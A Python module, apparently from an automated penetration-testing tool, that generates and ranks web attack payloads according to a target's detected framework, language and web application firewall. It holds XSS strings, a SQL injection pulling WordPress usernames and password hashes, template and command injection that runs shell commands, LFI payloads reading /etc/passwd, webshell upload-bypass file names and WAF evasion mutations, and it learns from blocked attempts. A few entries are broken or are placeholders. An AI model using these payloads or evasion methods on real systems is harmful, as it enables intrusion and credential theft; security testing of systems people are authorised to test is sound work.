"""
ai/adaptive_payload_engine.py - Adaptive Payload Engine
Generate intelligent payloads based on detected context and WAF indicators.
"""

import logging
import json
from typing import Dict, List, Any, Set
from enum import Enum

from ai.payload_gen import PayloadGenerator
from ai.payload_mutation import PayloadMutator

logger = logging.getLogger("recon.adaptive_payload")


class VulnerabilityType(str, Enum):
    """Supported vulnerability types."""
    XSS = "xss"
    SQLI = "sqli"
    COMMAND_INJECTION = "command_injection"
    TEMPLATE_INJECTION = "template_injection"
    LFI = "lfi"
    RFI = "rfi"
    FILE_UPLOAD = "file_upload"
    DESERIALIZATION = "deserialization"


class FrameworkType(str, Enum):
    """Detected frameworks."""
    WORDPRESS = "wordpress"
    LARAVEL = "laravel"
    DJANGO = "django"
    FLASK = "flask"
    EXPRESS = "express"
    ASP_NET = "asp.net"
    JAVA = "java"
    PHP = "php"


class WAFSignature(str, Enum):
    """Detected WAF signatures."""
    MODSC = "modsecurity"
    CLOUDFLARE = "cloudflare"
    AWS = "aws"
    AZURE = "azure"
    AKAMAI = "akamai"
    F5 = "f5"


class AdaptivePayloadEngine:
    """
    Generates context-aware payloads adapted to detected environments.
    
    Adapts to:
    - Detected frameworks (WordPress, Laravel, etc.)
    - Detected programming languages (PHP, Python, Node.js)
    - Previous payload results
    - WAF indicators
    - Input filtering
    """

    def __init__(self, payload_gen: PayloadGenerator = None, 
                 payload_mutator: PayloadMutator = None):
        self.payload_gen = payload_gen or PayloadGenerator()
        self.payload_mutator = payload_mutator or PayloadMutator()
        self.mutation_history = {}  # endpoint -> [previous attempts]

    def generate_adaptive_payloads(self, 
                                   endpoint: str,
                                   parameter: str,
                                   vuln_type: VulnerabilityType,
                                   context: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate adaptive payloads based on detected context and previous results.
        
        Args:
            endpoint: Target endpoint URL
            parameter: Parameter to target
            vuln_type: Type of vulnerability
            context: Dict with detection info (framework, language, waf, filters, etc.)
            
        Returns:
            Dict with generated payloads
        """
        logger.info(f"[ADAPTIVE] Generating payloads for {vuln_type} on {parameter}")
        
        # Extract context information
        detected_framework = context.get('framework')
        detected_language = context.get('language', 'php')
        detected_waf = context.get('waf')
        input_filters = context.get('filters', [])
        previous_results = context.get('previous_results', [])
        
        # Generate base payloads
        base_payloads = self._generate_base_payloads(vuln_type, detected_language)
        
        # Apply framework-specific adaptations
        if detected_framework:
            base_payloads = self._adapt_for_framework(
                base_payloads, detected_framework, vuln_type
            )
        
        # Apply language-specific adaptations
        base_payloads = self._adapt_for_language(
            base_payloads, detected_language, vuln_type
        )
        
        # Apply WAF evasion
        if detected_waf:
            mutated_payloads = self._apply_waf_evasion(
                base_payloads, detected_waf, input_filters
            )
        else:
            mutated_payloads = self.payload_mutator.mutate_payloads(base_payloads)
        
        # Learn from previous results
        final_payloads = self._filter_by_previous_results(
            mutated_payloads, endpoint, previous_results
        )
        
        return {
            'endpoint': endpoint,
            'parameter': parameter,
            'vulnerability_type': vuln_type.value,
            'framework': detected_framework,
            'language': detected_language,
            'waf': detected_waf,
            'base_payload_count': len(base_payloads),
            'mutated_payload_count': len(mutated_payloads),
            'final_payloads': final_payloads[:30],  # Top 30 payloads
            'payload_count': len(final_payloads),
            'adaptation_strategies': self._get_applied_strategies(
                detected_framework, detected_language, detected_waf
            )
        }

    def _generate_base_payloads(self, vuln_type: VulnerabilityType, 
                                language: str) -> List[str]:
        """Generate base payloads for vulnerability type."""
        if vuln_type == VulnerabilityType.XSS:
            return self.payload_gen.generate_xss(count=15)
        elif vuln_type == VulnerabilityType.SQLI:
            db_type = self._detect_db_type(language)
            return self.payload_gen.generate_sqli(db_type=db_type)
        elif vuln_type == VulnerabilityType.COMMAND_INJECTION:
            return self.payload_gen.generate_rce(context=language)
        elif vuln_type == VulnerabilityType.TEMPLATE_INJECTION:
            return self._generate_ssti_payloads(language)
        elif vuln_type == VulnerabilityType.LFI:
            return self.payload_gen.generate_lfi()
        elif vuln_type == VulnerabilityType.FILE_UPLOAD:
            return self._generate_upload_bypass_payloads(language)
        else:
            return []

    def _adapt_for_framework(self, payloads: List[str], framework: str, 
                            vuln_type: VulnerabilityType) -> List[str]:
        """Adapt payloads for detected framework."""
        adapted = []
        
        if framework == FrameworkType.WORDPRESS.value:
            # WordPress-specific payloads
            if vuln_type == VulnerabilityType.XSS:
                adaptive = [
                    "<img src=x onerror=\"wp.template\">",
                    "<svg/onload=fetch('/wp-admin/')>",
                    "JavaScript:eval(atob('...'))",
                ]
            elif vuln_type == VulnerabilityType.SQLI:
                adaptive = [
                    "' OR '1'='1' /*",
                    "' UNION SELECT user_login,user_pass FROM wp_users--",
                ]
            else:
                adaptive = payloads[:5]
            adapted.extend(adaptive)
        
        elif framework == FrameworkType.LARAVEL.value:
            # Laravel-specific payloads
            if vuln_type == VulnerabilityType.TEMPLATE_INJECTION:
                adaptive = [
                    "{{7*7}}",
                    "{{App\\Facades\\File::get('/etc/passwd')}}",
                    "${_GET[0]($_POST[1])}",
                ]
            else:
                adaptive = payloads[:5]
            adapted.extend(adaptive)
        
        elif framework == FrameworkType.EXPRESS.value:
            # Node.js Express-specific payloads
            if vuln_type == VulnerabilityType.COMMAND_INJECTION:
                adaptive = [
                    "'; require('child_process').exec('id'); //",
                    "${require('child_process').execSync('id')}",
                ]
            elif vuln_type == VulnerabilityType.TEMPLATE_INJECTION:
                adaptive = [
                    "<%= 7*7 %>",
                    "<% eval(\"process.exit(1)\") %>",
                ]
            else:
                adaptive = payloads[:5]
            adapted.extend(adaptive)
        
        else:
            # Generic framework payloads
            adapted = payloads[:10]
        
        return adapted

    def _adapt_for_language(self, payloads: List[str], language: str,
                           vuln_type: VulnerabilityType) -> List[str]:
        """Adapt payloads for detected programming language."""
        adapted = list(payloads)
        
        if language.lower() == 'php':
            if vuln_type == VulnerabilityType.COMMAND_INJECTION:
                adapted.extend([
                    "'; system('id'); //",
                    "'; exec('whoami'); //",
                    "`id`",
                    "$(id)",
                ])
            elif vuln_type == VulnerabilityType.LFI:
                adapted.extend([
                    "php://filter/convert.base64-encode/resource=/etc/passwd",
                    "php://input",
                    "data://text/plain,<?php phpinfo(); ?>",
                ])
        
        elif language.lower() in ['python', 'django', 'flask']:
            if vuln_type == VulnerabilityType.TEMPLATE_INJECTION:
                adapted.extend([
                    "{{''.__class__.__mro__[1].__subclasses__()}}",
                    "${__import__('os').popen('id').read()}",
                ])
            elif vuln_type == VulnerabilityType.COMMAND_INJECTION:
                adapted.extend([
                    "__import__('os').popen('id')",
                    "os.system('id')",
                ])
        
        elif language.lower() in ['node', 'javascript', 'express']:
            if vuln_type == VulnerabilityType.COMMAND_INJECTION:
                adapted.extend([
                    "require('child_process').exec('id')",
                    "require('os').execSync('id')",
                ])
        
        elif language.lower() in ['java', 'spring']:
            if vuln_type == VulnerabilityType.DESERIALIZATION:
                adapted.extend([
                    "ysoserial payloads",
                ])
        
        return adapted

    def _apply_waf_evasion(self, payloads: List[str], waf: str, 
                          filters: List[str]) -> List[str]:
        """Apply WAF-specific evasion techniques."""
        logger.info(f"[ADAPTIVE] Applying WAF evasion for {waf}")
        
        # Use payload mutator for WAF evasion
        mutated = self.payload_mutator.mutate_payloads(payloads)
        
        # Apply additional WAF-specific mutations
        additional = []
        
        if waf == WAFSignature.MODSC.value:
            # ModSecurity evasion
            additional.extend([
                p.replace(' ', '/**/') for p in payloads[:5]
            ])
        elif waf == WAFSignature.CLOUDFLARE.value:
            # Cloudflare evasion
            additional.extend([
                p.replace('"', "'") for p in payloads[:5]
            ])
        elif waf == WAFSignature.AWS.value:
            # AWS WAF evasion
            additional.extend([
                p.replace(' ', '%20') for p in payloads[:5]
            ])
        
        mutated.extend(additional)
        return mutated

    def _filter_by_previous_results(self, payloads: List[str], endpoint: str,
                                    previous_results: List[Dict[str, Any]]) -> List[str]:
        """Filter payloads based on previous attempt results."""
        if not previous_results:
            return payloads
        
        # Analyze what worked/failed
        blocked_patterns = set()
        working_patterns = set()
        
        for result in previous_results:
            if result.get('blocked'):
                pattern = result.get('payload_pattern', '')
                if pattern:
                    blocked_patterns.add(pattern)
            elif result.get('success'):
                pattern = result.get('payload_pattern', '')
                if pattern:
                    working_patterns.add(pattern)
        
        # Filter out payloads matching blocked patterns
        filtered = [
            p for p in payloads 
            if not any(bp in p for bp in blocked_patterns)
        ]
        
        # Prioritize payloads matching working patterns
        prioritized = []
        for pattern in working_patterns:
            prioritized.extend([p for p in filtered if pattern in p])
        
        # Add remaining payloads
        prioritized.extend([p for p in filtered if p not in prioritized])
        
        return prioritized

    def _detect_db_type(self, language: str) -> str:
        """Detect database type from language hints."""
        if 'mysql' in language.lower():
            return 'mysql'
        elif 'postgres' in language.lower():
            return 'postgres'
        elif 'mssql' in language.lower():
            return 'mssql'
        elif 'oracle' in language.lower():
            return 'oracle'
        return 'mysql'  # Default

    def _generate_ssti_payloads(self, language: str) -> List[str]:
        """Generate SSTI payloads for language."""
        payloads = []
        
        if 'php' in language.lower():
            payloads = [
                "{{7*7}}", "${7*7}", "<%7*7%>",
                "<?=7*7?>", "{#7*7#}", "[7*7]"
            ]
        elif 'python' in language.lower():
            payloads = [
                "{{7*7}}", "${7*7}",
                "{{''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1)}}"
            ]
        elif 'java' in language.lower():
            payloads = [
                "${7*7}", "#{7*7}",
                "{{@System.getProperty('java.version')}}"
            ]
        
        return payloads

    def _generate_upload_bypass_payloads(self, language: str) -> List[str]:
        """Generate file upload bypass payloads."""
        if 'php' in language.lower():
            return [
                'shell.php', 'shell.php5', 'shell.phtml',
                'shell.pHp', 'shell.php%00.jpg', 'shell.jpg.php',
                'shell.php.bak', 'shell.php~', 'shell.php.html'
            ]
        elif 'asp' in language.lower():
            return [
                'shell.asp', 'shell.aspx', 'shell.cer', 'shell.asa',
                'shell.htr', 'shell.asp%00.jpg'
            ]
        else:
            return [
                'shell.exe', 'shell.sh', 'shell.jsp', 'shell.py'
            ]

    def _get_applied_strategies(self, framework: str, language: str, waf: str) -> List[str]:
        """Get list of adaptation strategies applied."""
        strategies = []
        
        if framework:
            strategies.append(f"framework_adaptation_{framework}")
        if language:
            strategies.append(f"language_adaptation_{language}")
        if waf:
            strategies.append(f"waf_evasion_{waf}")
        
        return strategies

    def record_attempt(self, endpoint: str, parameter: str, payload: str, 
                      success: bool, blocked: bool = False) -> None:
        """Record payload attempt for future learning."""
        if endpoint not in self.mutation_history:
            self.mutation_history[endpoint] = []
        
        self.mutation_history[endpoint].append({
            'parameter': parameter,
            'payload': payload,
            'success': success,
            'blocked': blocked
        })


def generate_adaptive_payloads(endpoint: str, parameter: str, vuln_type: str,
                              context: Dict[str, Any]) -> Dict[str, Any]:
    """
    Standalone function to generate adaptive payloads.
    Integrates with scanning pipeline.
    """
    engine = AdaptivePayloadEngine()
    
    try:
        vuln_enum = VulnerabilityType[vuln_type.upper()]
    except KeyError:
        logger.warning(f"[ADAPTIVE] Unknown vulnerability type: {vuln_type}")
        return {'error': f'Unknown vulnerability type: {vuln_type}'}
    
    return engine.generate_adaptive_payloads(endpoint, parameter, vuln_enum, context)
